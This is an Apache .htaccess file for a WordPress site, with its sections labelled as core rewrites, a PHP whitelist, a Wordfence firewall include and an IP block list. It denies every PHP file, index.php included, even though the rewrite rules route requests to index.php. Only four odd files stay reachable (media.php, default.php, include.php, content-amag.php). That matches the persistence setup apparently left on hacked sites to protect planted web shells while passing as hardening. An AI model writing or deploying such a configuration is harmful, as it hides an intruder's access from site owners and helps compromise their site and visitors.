RewriteEngine On
RewriteBase /

# ====== WordPress Core ======
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]

# ====== Whitelist PHP Files ======
<FilesMatch "\.php$">
    Require all denied
</FilesMatch>

<Files "media.php">
    Require all granted
</Files>

<Files "default.php">
    Require all granted
</Files>

<Files "include.php">
    Require all granted
</Files>

<Files "content-amag.php">
    Require all granted
</Files>

# ====== Wordfence WAF ======
<IfModule LiteSpeed>
php_value auto_prepend_file '/home/gk4juni457tt/public_html/taalumgroup.com/wordfence-waf.php'
</IfModule>

<IfModule lsapi_module>
php_value auto_prepend_file '/home/gk4juni457tt/public_html/taalumgroup.com/wordfence-waf.php'
</IfModule>

# ====== Block suspicious IPs ======
Deny from 159.223.0.0/16
Deny from 208.76.0.0/16
